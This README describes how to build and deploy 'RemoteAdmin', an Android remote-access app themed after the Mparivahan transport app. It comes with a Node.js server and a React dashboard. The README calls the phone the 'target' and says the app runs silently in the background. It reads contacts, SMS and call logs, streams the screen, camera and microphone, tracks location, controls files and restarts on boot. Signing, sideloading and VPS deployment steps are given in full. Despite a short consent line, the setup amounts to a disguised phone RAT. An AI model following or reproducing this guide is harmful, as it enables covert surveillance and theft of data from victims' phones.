# RemoteAdmin — Mparivahan Themed Remote Administration Platform

A complete remote phone administration system with an Android app, Node.js signaling server, and React web dashboard. The admin can see the phone screen in real-time, control it remotely, access camera/microphone, track location, and manage files — all from a browser.

---

## Architecture

```
┌──────────────────────┐    WebSocket + WebRTC    ┌──────────────────────┐
│    Android Client     │◄───────────────────────►│   Signaling Server   │
│  (runs on target      │    Commands, SDP/ICE    │    (Node.js)         │
│   phone in background)│    Screen/Camera/Audio  │    Port 3001         │
└──────────────────────┘                          └──────────┬───────────┘
                                                             │
                                                             │ WebSocket
                                                             │
                                                   ┌─────────▼──────────┐
                                                   │    Web Dashboard    │
                                                   │    (React + MUI)    │
                                                   │    Port 3000        │
                                                   └────────────────────┘
                                                   Open in any browser
```

## Features

| Feature | How It Works |
|---------|-------------|
| **Live Screen** | WebRTC peer-to-peer streaming, click/drag forwarded as touch events |
| **Remote Control** | AccessibilityService injects taps, swipes, scrolls, text input |
| **Camera Feed** | Camera2 API streams front/back camera to dashboard |
| **Microphone** | AudioRecord captures and streams audio live |
| **GPS Location** | FusedLocationProvider tracks device location in real-time |
| **File Explorer** | Browse, download, upload, delete files on the device |
| **Contacts/SMS/Calls** | Read all data via ContentProviders |
| **App Launch** | Open any installed app by package name |
| **Background Operation** | Runs as foreground service, survives app close, auto-restarts on boot |

---

## Prerequisites

| Component | Requirements |
|-----------|-------------|
| **Server** | Node.js 18+ and npm |
| **Dashboard** | Node.js 18+ and npm (for building) |
| **Android** | Android Studio, JDK 17, Android SDK 34 |
| **Deployment** | Any Linux VPS (DigitalOcean, Hetzner, AWS) with Docker (optional) |

---

## 1. Server Setup

The signaling server handles WebSocket connections, authentication, command routing, and WebRTC signaling between devices and the dashboard.

### Install and Run

```bash
cd RemoteAdminApp/server

# Install dependencies
npm install

# Configure (edit .env with your settings)
# Change ADMIN_PASSWORD and JWT_SECRET for production!
nano .env

# Start the server
npm start
```

The server starts on **port 3001**. You should see:
```
┌───────────────────────────────────────────┐
│  RemoteAdmin Signaling Server             │
│  Port: 3001                               │
│  WebSocket: ws://localhost:3001/ws        │
│  Health: http://localhost:3001/api/health  │
└───────────────────────────────────────────┘
```

### Server Configuration (.env)

```env
PORT=3001                                    # Server port
JWT_SECRET=change-this-to-random-string      # JWT signing secret
ADMIN_PASSWORD=admin123                      # Dashboard login password
CORS_ORIGIN=*                                # Allowed origins (use specific URL in production)
```

### Verify Server is Running

```bash
curl http://localhost:3001/api/health
# Should return: {"status":"ok","devices":0,"sessions":0}
```

---

## 2. Dashboard Setup

The React web dashboard is the admin control panel — open it in any browser.

### Install and Run (Development)

```bash
cd RemoteAdminApp/dashboard

# Install dependencies
npm install

# Start development server on port 3000
npm start
```

Open **http://localhost:3000** in your browser.

### Build for Production

```bash
cd RemoteAdminApp/dashboard

# Install dependencies (if not done)
npm install

# Build optimized production bundle
npm run build

# Serve the build (install serve globally or use npx)
npx serve build -l 3000
```

The production build is in `dashboard/build/` — a static folder you can host anywhere.

### Login

1. Open the dashboard URL in your browser
2. Enter the **Server URL** (e.g., `http://YOUR-SERVER-IP:3001`)
3. Enter the **Password** (default: `admin123`)
4. Click **CONNECT**

You'll see the device list — empty until a phone connects.

---

## 3. Android APK Build

### Install Android Studio

1. Download from https://developer.android.com/studio
2. During setup, install:
   - Android SDK (API 34)
   - Android SDK Build-Tools 34.0.0
   - Android SDK Platform-Tools

### Build the APK

**Using Android Studio (Recommended):**

1. Open Android Studio
2. Click **File → Open** → navigate to `RemoteAdminApp/android/` → select it
3. Wait for Gradle sync to complete (first time: 5–10 minutes)
4. If prompted to install SDK components, click **Install**
5. **To build debug APK:**
   - Menu: **Build → Build Bundle(s) / APK(s) → Build APK(s)**
   - Wait for build to complete
   - Click **locate** in the notification to find the APK
   - Output: `android/app/build/outputs/apk/debug/app-debug.apk`

**Using Command Line:**

```bash
cd RemoteAdminApp/android

# Debug APK
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/app-debug.apk

# Release APK (unsigned)
./gradlew assembleRelease
```

### Sign a Release APK (for distribution)

```bash
# 1. Generate a keystore (one-time)
keytool -genkey -v -keystore remoteadmin.keystore \
  -alias remoteadmin -keyalg RSA -keysize 2048 -validity 10000

# 2. Align the APK
zipalign -v 4 app-release-unsigned.apk app-release-aligned.apk

# 3. Sign it
apksigner sign --ks remoteadmin.keystore \
  --ks-key-alias remoteadmin \
  --out app-release-signed.apk \
  app-release-aligned.apk
```

---

## 4. Connect a Device

### Install the APK on the Phone

**Via USB:**
1. Enable **Developer Options** on the phone (tap Build Number 7 times in Settings)
2. Enable **USB Debugging**
3. Connect phone via USB
4. Run: `adb install app-debug.apk`

**Via APK File:**
1. Copy `app-debug.apk` to the phone (USB, email, cloud storage)
2. Open the file on the phone
3. Allow "Install from Unknown Sources" if prompted
4. Tap **Install**

### Setup the App (4 Steps)

1. **Open RemoteAdmin** — tap **CONTINUE**
2. **Grant Permissions** — tap **GRANT PERMISSIONS**, allow all when prompted
3. **Enable Accessibility** — tap **OPEN SETTINGS**, find "RemoteAdmin" in Accessibility, enable it. Tap **NEXT**
4. **Enter Server Details:**
   - **Server URL**: `http://YOUR-SERVER-IP:3001`
   - **Device Name**: any name (e.g., "Samsung Galaxy S24")
   - Tap **CONNECT & FINISH**

The app now runs **silently in the background**. You can close it — the foreground service keeps it alive.

### Verify Connection

On the phone: you'll see a persistent notification saying "Status: Connected"

On the dashboard: the device appears in the grid with its name, model, battery level, and connection time.

---

## 5. Use the Admin Panel

### Device List
- All connected devices appear as cards with name, model, Android version, battery, and status dots (Screen/Camera/Mic)
- Click any device card to open its control panel

### Device Control
- **Live Screen**: Real-time phone screen. Click = tap, drag = swipe, scroll = scroll, right-click = back, double-click = home
- **Screen Capture**: Start/Stop the screen stream
- **Camera**: Toggle front/back camera feed (shows as picture-in-picture on the screen)
- **Microphone**: Toggle live audio listening
- **Navigation**: Back, Home, Recents buttons + scroll up/down
- **Text Input**: Type text and send it to the phone
- **Location**: GPS coordinates with "Open in Google Maps" link
- **Quick Actions**: Open Settings, Notifications, Quick Settings

---

## 6. Docker Deployment (Production)

### Quick Start with Docker Compose

```bash
cd RemoteAdminApp

# Edit .env with your production settings
nano server/.env

# Start everything
docker-compose up -d

# Dashboard: http://YOUR-SERVER-IP:3000
# Server: http://YOUR-SERVER-IP:3001
```

### Manual VPS Deployment

```bash
# On your VPS (Ubuntu/Debian):

# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Clone or upload the project
scp -r RemoteAdminApp/ root@YOUR-SERVER:/opt/remoteadmin

# Start the server
cd /opt/remoteadmin/server
npm install
npm start &

# Build and serve the dashboard
cd /opt/remoteadmin/dashboard
npm install
npm run build
npx serve build -l 3000 &
```

### Recommended VPS Providers

| Provider | Cheapest Plan | Good For |
|----------|--------------|----------|
| **DigitalOcean** | $6/mo Droplet | Easy setup, good docs |
| **Hetzner** | €4.50/mo CX22 | Best value, European |
| **Vultr** | $6/mo | Global locations |
| **AWS Lightsail** | $5/mo | If already on AWS |

---

## 7. Project Structure

```
RemoteAdminApp/
├── README.md                          # This file
├── APK_BUILD_GUIDE.md                 # Detailed APK build instructions
├── docker-compose.yml                 # Docker deployment
├── deploy.sh                          # Build and deploy script
│
├── server/                            # Node.js signaling server
│   ├── package.json
│   ├── Dockerfile
│   ├── .env                           # Configuration
│   └── src/
│       ├── server.js                  # Main server (WebSocket + REST)
│       └── webrtc-config.js           # STUN/TURN configuration
│
├── dashboard/                         # React admin panel
│   ├── package.json
│   ├── Dockerfile
│   ├── nginx.conf                     # Production nginx config
│   ├── public/index.html
│   └── src/
│       ├── App.js                     # Root component
│       ├── theme.js                   # Mparivahan MUI theme
│       ├── hooks/
│       │   ├── useWebSocket.js        # WebSocket connection hook
│       │   └── useWebRTC.js           # WebRTC peer connection hook
│       └── components/
│           ├── LoginScreen.js         # Login page
│           ├── AdminPanel.js          # Device list + control center
│           └── DeviceControl.js       # Screen viewer + controls
│
└── android/                           # Android app
    ├── build.gradle                   # Root build config
    ├── settings.gradle
    ├── app/
    │   ├── build.gradle               # App dependencies
    │   ├── proguard-rules.pro
    │   └── src/main/
    │       ├── AndroidManifest.xml    # All permissions + services
    │       ├── java/com/remoteadmin/mparivahan/
    │       │   ├── RemoteAdminApp.java       # Application class
    │       │   ├── SetupActivity.java        # 4-step permission wizard
    │       │   ├── services/
    │       │   │   ├── ConnectionService.java    # WebSocket + command dispatch
    │       │   │   ├── ScreenCaptureService.java # MediaProjection
    │       │   │   ├── RemoteControlService.java # AccessibilityService
    │       │   │   ├── CameraStreamService.java  # Camera2 API
    │       │   │   ├── AudioStreamService.java   # AudioRecord
    │       │   │   ├── DataService.java          # ContentProviders
    │       │   │   ├── LocationService.java      # GPS tracking
    │       │   │   └── WebRTCClient.java         # PeerConnection
    │       │   └── receivers/
    │       │       └── BootReceiver.java         # Auto-start on boot
    │       └── res/
    │           ├── layout/activity_setup.xml
    │           ├── values/colors.xml, strings.xml, themes.xml
    │           ├── drawable/ (icons)
    │           └── xml/ (accessibility, network, file provider configs)
```

---

## 8. Security Notes

- **Authentication**: Dashboard login with password → JWT token
- **Encryption**: WebRTC uses DTLS-SRTP for media; WebSocket should use WSS in production
- **Visible Indicator**: A persistent notification is always shown when remote access is active
- **Background Location**: Requires separate permission grant on Android 11+
- **Change defaults**: Always change `ADMIN_PASSWORD` and `JWT_SECRET` in `server/.env` for production

---

## 9. Troubleshooting

| Issue | Solution |
|-------|----------|
| Device not appearing in dashboard | Check server URL in app matches server address. Ensure server is running. |
| Screen not streaming | Enable Accessibility Service in phone settings. Grant screen capture permission. |
| WebRTC connection fails | Check firewall allows UDP traffic. Add TURN server for restrictive networks. |
| Camera/Mic not working | Grant camera and microphone permissions in Android settings |
| Location not showing | Grant "Allow all the time" location permission, not just "While using app" |
| App killed by phone | Add app to battery optimization whitelist. The foreground service helps prevent this. |
| Dashboard shows "Offline" | Server is not running or wrong URL. Check `curl http://YOUR-SERVER:3001/api/health` |

---

## License

For authorized use only. Ensure you have proper consent before deploying on any device.
